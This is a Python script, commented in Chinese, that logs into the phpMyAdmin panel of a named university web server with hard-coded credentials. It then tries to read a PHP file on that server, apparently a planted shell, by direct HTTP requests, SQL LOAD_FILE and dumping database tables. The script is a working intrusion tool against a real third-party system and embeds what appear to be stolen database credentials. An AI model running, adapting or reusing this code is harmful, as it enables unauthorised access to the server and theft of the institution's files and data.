#!/usr/bin/env python3
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

target = "/var/www/html/banpot/scmeeting/x.php"

# 方法1: 直接通过HTTP访问（如果文件可访问）
print("[*] 方法1: 直接HTTP访问...")
test_urls = [
    "https://olympic.su.ac.th/banpot/scmeeting/x.php",
    "https://olympic.su.ac.th/scmeeting/x.php", 
]
for test_url in test_urls:
    try:
        resp = requests.get(test_url, verify=False, timeout=5)
        if resp.status_code == 200 and '<?php' in resp.text:
            print(f"[+] 找到文件: {test_url}")
            print("=" * 70)
            print(resp.text)
            print("=" * 70)
            exit(0)
    except:
        pass

# 方法2: 通过SQL LOAD_FILE，然后查看AJAX响应
print("[*] 方法2: SQL LOAD_FILE...")
sql_data = {"sql_query": f"SELECT LOAD_FILE('{target}');", "db": "scmeeting"}
resp = session.post(url + "db_sql.php", params={"token": token, "db": "scmeeting"}, data=sql_data)

# 查找AJAX请求URL
ajax_url_match = re.search(r'ajax_request[^"]*url=([^"&]+)', resp.text)
if ajax_url_match:
    ajax_url = ajax_url_match.group(1)
    ajax_resp = session.get(url + ajax_url, verify=False)
    if '<?php' in ajax_resp.text:
        print("[+] AJAX响应中找到内容:")
        print(ajax_resp.text[:1000])
        exit(0)

# 方法3: 查询scmeeting数据库的所有表和数据
print("[*] 方法3: 查询数据库表...")
sql_data = {"sql_query": "SHOW TABLES;", "db": "scmeeting"}
resp = session.post(url + "db_sql.php", params={"token": token, "db": "scmeeting"}, data=sql_data)
tables = re.findall(r'<td[^>]*>([^<]+)</td>', resp.text)
tables = [t.strip() for t in tables if t.strip() and len(t.strip()) > 2]

for table in tables[:5]:
    print(f"  查询表: {table}")
    sql_data = {"sql_query": f"SELECT * FROM `{table}` LIMIT 20;", "db": "scmeeting"}
    resp2 = session.post(url + "db_sql.php", params={"token": token, "db": "scmeeting"}, data=sql_data)
    
    # 查找包含x.php或文件路径的内容
    if 'x.php' in resp2.text or 'banpot' in resp2.text or '<?php' in resp2.text:
        print(f"[+] 在表 {table} 中找到相关内容")
        # 提取表格内容
        rows = re.findall(r'<tr[^>]*>(.*?)</tr>', resp2.text, re.DOTALL)
        for row in rows[:5]:
            cells = re.findall(r'<td[^>]*>(.*?)</td>', row, re.DOTALL)
            for cell in cells:
                cell_text = re.sub(r'<[^>]+>', '', cell).strip()
                if '<?php' in cell_text or ('x.php' in cell_text and len(cell_text) > 10):
                    print("=" * 70)
                    print(cell_text)
                    print("=" * 70)
                    exit(0)

print("[-] 未找到文件内容")
